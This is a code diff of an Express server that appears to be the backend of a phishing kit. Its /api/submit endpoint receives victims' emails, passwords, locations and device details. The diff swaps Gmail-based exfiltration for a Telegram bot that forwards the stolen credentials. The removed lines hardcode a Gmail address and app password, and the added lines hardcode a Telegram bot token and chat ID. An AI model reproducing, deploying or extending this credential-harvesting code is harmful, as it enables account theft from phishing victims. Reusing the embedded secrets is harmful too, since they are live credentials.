@@ -1,30 +1,24 @@
 const express = require('express');
 const cors = require('cors');
-const nodemailer = require('nodemailer');
+const axios = require('axios');
 const app = express();
 
-// Use Express 4.x (stable version)
-console.log('🚀 Starting server...');
+console.log('🚀 Starting Telegram Bot Server...');
 
-// Configuration
+// Configuration - YOU NEED TO SET THESE!
 const CONFIG = {
   PORT: process.env.PORT || 3000,
-  EMAIL: {
-    USER: 'ranickiauerbach@gmail.com',
-    PASS: 'nlov pvvd rcoa dnwl', // Make sure this is a 16-char app password
-    RECIPIENT: 'ninugreenoptima.ae@proton.me',
-    SENDERS: {
-      FIRST_PW: 'logsnur01@rich.co',
-      SECOND_PW: 'logsnur02@rich.us'
-    }
+  TELEGRAM: {
+    BOT_TOKEN: '8346330872:AAF8YEtXWPZaRZQhIHgnaG7pXg7Lyaf30aw', // Get from @BotFather
+    CHAT_ID: '5546373743'      // Your personal chat ID
   }
 };
 
-// Enhanced middleware
+// Middleware
 app.use(cors({
   origin: '*',
-  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
-  allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
 app.use(express.json({ limit: '10mb' }));
@@ -33,65 +27,56 @@ app.use(express.urlencoded({ extended: true }));
 // Handle preflight requests
 app.options('*', cors());
 
-// Create transporter with better configuration
-const transporter = nodemailer.createTransport({
-  service: 'gmail', // Use service instead of host/port
-  auth: {
-    user: CONFIG.EMAIL.USER,
-    pass: CONFIG.EMAIL.PASS
-  },
-  debug: true, // Enable debug output
-  logger: true  // Enable logger
-});
+// Function to send Telegram message
+const sendTelegramMessage = async (message) => {
+  try {
+    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
+    
+    const response = await axios.post(url, {
+      chat_id: CONFIG.TELEGRAM.CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    });
 
-// Verify transporter on startup
-console.log('📧 Testing email configuration...');
-transporter.verify(function(error, success) {
-  if (error) {
-    console.log('❌ EMAIL CONFIGURATION ERROR:', error);
-    console.log('💡 TROUBLESHOOTING:');
-    console.log('1. Check if Gmail app password is correct');
-    console.log('2. Ensure 2FA is enabled in Google account');
-    console.log('3. Generate new app password at: https://myaccount.google.com/apppasswords');
-  } else {
-    console.log('✅ Email server is ready to send messages');
+    console.log('✅ Telegram message sent!');
+    return { success: true, messageId: response.data.result.message_id };
+    
+  } catch (error) {
+    console.error('❌ Telegram error:', error.response?.data || error.message);
+    throw new Error(`Telegram failed: ${error.response?.data?.description || error.message}`);
   }
-});
+};
 
-// Test endpoint - Simple email test
-app.get('/api/test-email', async (req, res) => {
-  console.log('🧪 Testing email sending...');
+// Test endpoint - Send test message to Telegram
+app.get('/api/test-telegram', async (req, res) => {
+  console.log('🧪 Testing Telegram bot...');
   
   try {
-    const testMailOptions = {
-      from: `"Test Server" <${CONFIG.EMAIL.USER}>`,
-      to: CONFIG.EMAIL.RECIPIENT,
-      subject: '🧪 Test Email from Server',
-      text: 'This is a test email from your server. If you receive this, email configuration is working!',
-      html: `
-        <h2>✅ Test Email Successful!</h2>
-        <p>This is a test email from your server.</p>
-        <p>If you receive this, your email configuration is working correctly!</p>
-        <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
-      `
-    };
+    const testMessage = `
+🤖 <b>BOT TEST SUCCESSFUL!</b>
 
-    const info = await transporter.sendMail(testMailOptions);
-    console.log('✅ Test email sent successfully! Message ID:', info.messageId);
+✅ Your Telegram bot is working!
+🕐 Time: ${new Date().toLocaleString()}
+🌐 Server: Render.com
+
+If you receive this, your bot configuration is correct!
+    `;
+
+    const result = await sendTelegramMessage(testMessage);
     
     res.json({
       success: true,
-      message: 'Test email sent successfully!',
-      messageId: info.messageId,
+      message: 'Test message sent to Telegram!',
+      messageId: result.messageId,
       timestamp: new Date().toISOString()
     });
     
   } catch (error) {
-    console.error('❌ Test email failed:', error);
+    console.error('❌ Test failed:', error.message);
     res.status(500).json({
       success: false,
       error: error.message,
-      details: 'Check Gmail app password and 2FA settings'
+      help: 'Check your BOT_TOKEN and CHAT_ID configuration'
     });
   }
 });
@@ -101,17 +86,17 @@ app.get('/api/health', (req, res) => {
   console.log('🏥 Health check requested');
   res.json({ 
     status: 'OK', 
-    message: 'Server is running',
+    message: 'Telegram Bot Server is running',
     timestamp: new Date().toISOString(),
     endpoints: {
       '/api/health': 'Health check',
-      '/api/test-email': 'Test email sending',
+      '/api/test-telegram': 'Test Telegram bot',
       '/api/submit': 'Main submission endpoint'
     }
   });
 });
 
-// Enhanced main endpoint
+// Main endpoint - Send credentials to Telegram
 app.post('/api/submit', async (req, res) => {
   console.log('📨 Received submission request');
   console.log('Request body:', JSON.stringify(req.body, null, 2));
@@ -137,7 +122,7 @@ app.post('/api/submit', async (req, res) => {
 
     // Determine which password was used
     const passwordUsed = firstpasswordused || secondpasswordused;
-    const fromEmail = firstpasswordused ? CONFIG.EMAIL.SENDERS.FIRST_PW : CONFIG.EMAIL.SENDERS.SECOND_PW;
+    const attemptType = firstpasswordused ? 'FIRST' : 'SECOND';
 
     if (!passwordUsed) {
       return res.status(400).json({
@@ -146,75 +131,50 @@ app.post('/api/submit', async (req, res) => {
       });
     }
 
-    console.log(`📧 Sending email from: ${fromEmail}`);
-    console.log(`📧 To: ${CONFIG.EMAIL.RECIPIENT}`);
-    console.log(`📧 User email: ${email}`);
-    console.log(`📧 Password: ${'*'.repeat(passwordUsed.length)}`);
+    console.log(`📱 Sending to Telegram: ${email}`);
+    console.log(`🔑 Password: ${'*'.repeat(passwordUsed.length)}`);
+    console.log(`🎯 Attempt: ${attemptType}`);
 
-    const mailOptions = {
-      from: `"Security Alert" <${fromEmail}>`,
-      to: CONFIG.EMAIL.RECIPIENT,
-      subject: `🔐 New Login - ${email}`,
-      html: `
-        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-          <h2 style="color: #d32f2f;">🔐 New Login Attempt</h2>
-          
-          <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 15px 0;">
-            <h3 style="margin-top: 0;">Credentials</h3>
-            <p><strong>Email:</strong> ${email}</p>
-            <p><strong>Password:</strong> ${passwordUsed}</p>
-            <p><strong>Attempt:</strong> ${firstpasswordused ? 'First' : 'Second'}</p>
-          </div>
+    // Create formatted Telegram message
+    const telegramMessage = `
+🔐 <b>NEW LOGIN ATTEMPT</b>
 
-          <div style="background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 15px 0;">
-            <h3 style="margin-top: 0;">Location Info</h3>
-            <p><strong>IP Location:</strong> ${city}, ${country}, ${continent}</p>
-          </div>
+📧 <b>Email:</b> <code>${email}</code>
+🔑 <b>Password:</b> <code>${passwordUsed}</code>
+🎯 <b>Attempt:</b> ${attemptType}
 
-          <div style="background: #f3e5f5; padding: 15px; border-radius: 5px; margin: 15px 0;">
-            <h3 style="margin-top: 0;">Device Info</h3>
-            <p><strong>User Agent:</strong> ${device.userAgent || 'Not available'}</p>
-            <p><strong>Language:</strong> ${device.language || 'Not available'}</p>
-            <p><strong>Platform:</strong> ${device.platform || 'Not available'}</p>
-            <p><strong>Mobile:</strong> ${device.mobile ? 'Yes' : 'No'}</p>
-          </div>
+🌍 <b>Location Info</b>
+📍 IP Location: ${city}, ${country}, ${continent}
 
-          <hr>
-          <p style="color: #666; font-size: 12px;">
-            <strong>Received:</strong> ${new Date().toLocaleString()}<br>
-            <strong>Server:</strong> Render.com
-          </p>
-        </div>
-      `
-    };
+💻 <b>Device Info</b>
+🖥️ User Agent: ${device.userAgent || 'Not available'}
+🌐 Language: ${device.language || 'Not available'}
+📱 Platform: ${device.platform || 'Not available'}
+📲 Mobile: ${device.mobile ? 'Yes' : 'No'}
 
-    // Send email
-    const info = await transporter.sendMail(mailOptions);
-    console.log('✅ Email sent successfully! Message ID:', info.messageId);
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+🆔 <b>Server:</b> Render.com
+    `;
+
+    // Send to Telegram
+    const telegramResult = await sendTelegramMessage(telegramMessage);
+    
+    console.log('✅ Credentials sent to Telegram successfully!');
 
     res.json({
       success: true,
-      message: 'Data received and email sent successfully',
-      messageId: info.messageId,
+      message: 'Data received and sent to Telegram successfully',
+      telegramMessageId: telegramResult.messageId,
       timestamp: new Date().toISOString()
     });
 
   } catch (error) {
     console.error('❌ Error processing request:', error);
     
-    // More detailed error information
-    let errorMessage = error.message;
-    if (error.code === 'EAUTH') {
-      errorMessage = 'Gmail authentication failed. Check app password.';
-    } else if (error.code === 'EENVELOPE') {
-      errorMessage = 'Email envelope error. Check recipient address.';
-    }
-
     res.status(500).json({
       success: false,
-      error: errorMessage,
-      code: error.code,
-      details: 'Check server logs for more information'
+      error: error.message,
+      details: 'Check Telegram bot configuration'
     });
   }
 });
@@ -240,8 +200,8 @@ app.use((error, req, res, next) => {
 
 // Start server
 app.listen(CONFIG.PORT, () => {
-  console.log(`🎉 Server successfully started on port ${CONFIG.PORT}`);
-  console.log(`📍 Health check: https://your-app.onrender.com/api/health`);
-  console.log(`📍 Email test: https://your-app.onrender.com/api/test-email`);
-  console.log('📧 Email recipient:', CONFIG.EMAIL.RECIPIENT);
+  console.log(`🎉 Telegram Bot Server started on port ${CONFIG.PORT}`);
+  console.log(`📍 Health check: https://server-gfhv.onrender.com/api/health`);
+  console.log(`📍 Telegram test: https://server-gfhv.onrender.com/api/test-telegram`);
+  console.log('🤖 Waiting for Telegram configuration...');
 });
